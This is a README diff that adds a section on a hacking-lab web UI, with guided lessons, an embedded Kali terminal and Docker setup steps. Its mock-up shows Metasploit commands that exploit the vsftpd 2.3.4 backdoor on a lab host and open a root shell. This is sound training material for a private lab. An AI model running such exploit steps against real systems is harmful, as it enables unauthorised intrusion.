@@ -261,6 +261,66 @@ msf6> run
 
 ---
 
+## 0x06.5 // LEARNING LAB WEB UI
+
+A web interface with **embedded Kali terminal** and **guided lessons**.
+
+```
+┌─────────────────────────────────────────────────────────────────────────────┐
+│  LESSON: FTP Backdoor          │  KALI TERMINAL                   [LIVE]   │
+│  ────────────────────────────  │  ─────────────────────────────────────── │
+│  Step 3: Load the exploit      │  root@kali:~# msfconsole                  │
+│  ┌───────────────────────────┐ │  msf6 > use exploit/unix/ftp/vsftpd...   │
+│  │ use exploit/unix/ftp/     │ │  msf6 > set RHOSTS 172.20.0.15           │
+│  │ vsftpd_234_backdoor       │ │  msf6 > run                              │
+│  │                    [COPY] │ │  [*] Command shell session 1 opened      │
+│  └───────────────────────────┘ │  whoami                                   │
+│                                │  root                                     │
+│  [← PREV]         [NEXT →]     │                                           │
+└─────────────────────────────────────────────────────────────────────────────┘
+```
+
+### Start the Lab UI
+
+```bash
+# 1. Start Kali attack box (has web terminal)
+docker-compose up kali -d
+
+# 2. Start the web UI
+cd lab-ui
+pip3 install -r requirements.txt
+python3 app.py
+
+# 3. Open in browser
+open http://localhost:5000
+```
+
+### What You Get
+
+| URL | What It Is |
+|-----|------------|
+| http://localhost:5000 | Lab UI - lesson selector |
+| http://localhost:7681 | Kali terminal (standalone) |
+| http://localhost:9999 | Dozzle - Docker log viewer |
+
+### Kali Attack Box
+
+The Kali container has:
+- Metasploit, Nmap, Hydra, John, SQLMap, Nikto, Gobuster
+- Web terminal via ttyd (accessible in browser!)
+- Persistent storage for /root/.msf4 and /root/loot
+- SecLists mounted at /root/wordlists
+
+```bash
+# Access via browser
+open http://localhost:7681
+
+# Or via docker
+docker exec -it kali bash
+```
+
+---
+
 ## 0x07 // WHAT GETS SYNCED
 
 | Synced (Version Controlled) | NOT Synced (Machine-Specific) |
